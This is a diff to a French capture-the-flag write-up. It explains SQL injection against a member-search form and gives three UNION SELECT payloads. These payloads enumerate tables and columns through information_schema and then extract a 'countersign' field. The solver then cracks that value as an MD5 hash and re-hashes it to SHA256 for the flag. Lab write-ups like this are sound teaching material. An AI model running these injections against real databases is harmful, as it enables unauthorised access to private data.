@@ -1,16 +1,37 @@
-Trouver les noms de la table :
-1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- 
+Définition :
+L’injection SQL est une vulnérabilité qui se produit lorsqu’une application insère directement des données provenant de l’utilisateur
+dans une requête SQL sans les filtrer ou les préparer correctement.
+Cela permet à un attaquant de modifier le comportement de la requête et d’accéder à des données qu’il ne devrait pas voir.
 
-1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=0x7573657273 
+Dans notre cas :
+Le site a un formulaire pour chercher un membre par son ID.
+Le champ ID est utilisé directement dans une requête SQL.
+On a pu injecter des commandes SQL comme :
 
-1 UNION ALL SELECT town, Commentaire FROM users WHERE user_id=5 --
+(Sert a connaitre le nom des tables)
+1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() --
 
-10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+(Sert à connaitre le nom des columns)
+1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=0x7573657273
 
-user_id
-town
-planet
-country
-countersign
-first_name
-last_name
+- user_id
+- town
+- planet
+- country
+- countersign
+- first_name
+- last_name
+- Commentaire
+
+(Sert à avoir les information qu'on veut dans la BDD)
+1 UNION ALL SELECT countersign, Commentaire FROM users WHERE user_id=5 --
+Une fois cette commande faite, cela nous a donné un message (Voir image.png)
+Nous avons donc suivi les instruction.
+1 aller sur le site https://md5decrypt.net/
+2 Décrypter le message
+3 Mettre le résultat en minuscule (fortytwo)
+4 Et ensuite nous avons encrypté le résultat en SHA256 avec https://emn178.github.io/online-tools/sha256.html
+
+
+Qui nous on donné le flag.
+Les injection SQL qu'on utilise on pour base d'utiliser le keyword UNION qui permet de combiner des commandes SQL entre elle.
